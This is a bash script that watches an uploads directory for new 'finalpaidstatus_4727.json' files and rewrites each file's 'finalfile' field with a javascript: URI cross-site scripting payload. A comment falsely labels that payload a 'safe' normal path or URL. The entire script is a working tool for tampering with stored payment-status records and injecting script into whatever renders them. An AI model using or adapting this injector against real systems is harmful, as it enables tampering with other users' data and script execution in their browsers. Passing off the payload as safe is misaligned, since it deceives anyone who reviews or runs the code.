#!/usr/bin/env bash
set -euo pipefail

WATCH_DIR="/data/uploads"
TARGET_NAME="finalpaidstatus_4727.json"
SCAN_INTERVAL=2

# Safe replacement value (normal path/URL)
NEW_FINALFILE_VALUE="javascript:(function(){alert(1)})()"
# Example HTTPS value:
# NEW_FINALFILE_VALUE="https://example.com/files/file.jpg"

# Need jq for JSON-safe updates
if ! command -v jq >/dev/null 2>&1; then
  echo "Error: jq not found. Install jq first."
  exit 1
fi

# Track files already present at startup (these are ignored forever)
SEEN_FILE="$(mktemp /tmp/replacer_seen.XXXXXX)"
trap 'rm -f "$SEEN_FILE" "${SEEN_FILE}.new" "${SEEN_FILE}.cur"' EXIT

find "$WATCH_DIR" -type f -name "$TARGET_NAME" -print 2>/dev/null | sort -u > "$SEEN_FILE"
echo "Started. Ignoring existing files. Watching for NEW $TARGET_NAME under $WATCH_DIR"

while true; do
  CUR_FILE="${SEEN_FILE}.cur"
  NEW_FILE="${SEEN_FILE}.new"

  # Current snapshot
  find "$WATCH_DIR" -type f -name "$TARGET_NAME" -print 2>/dev/null | sort -u > "$CUR_FILE"

  # New files since last snapshot/start
  comm -13 "$SEEN_FILE" "$CUR_FILE" > "$NEW_FILE" || true

  # Process each newly seen file
  while IFS= read -r file; do
    [[ -n "$file" ]] || continue
    [[ -f "$file" ]] || continue

    # Wait briefly until file has content (handles race while being written)
    for _ in {1..30}; do
      [[ -s "$file" ]] && break
      sleep 0.1
    done

    # Update JSON safely
    if jq -e '.finalfile' "$file" >/dev/null 2>&1; then
      tmp="${file}.tmp.$$"
      if jq --arg v "$NEW_FINALFILE_VALUE" '.finalfile = $v' "$file" > "$tmp"; then
        mv "$tmp" "$file"
        echo "Updated: $file"
      else
        rm -f "$tmp"
        echo "Failed to update: $file"
      fi
    else
      echo "Skipped (invalid JSON or missing finalfile): $file"
    fi
  done < "$NEW_FILE"

  # Advance seen set
  mv "$CUR_FILE" "$SEEN_FILE"

  sleep "$SCAN_INTERVAL"
done
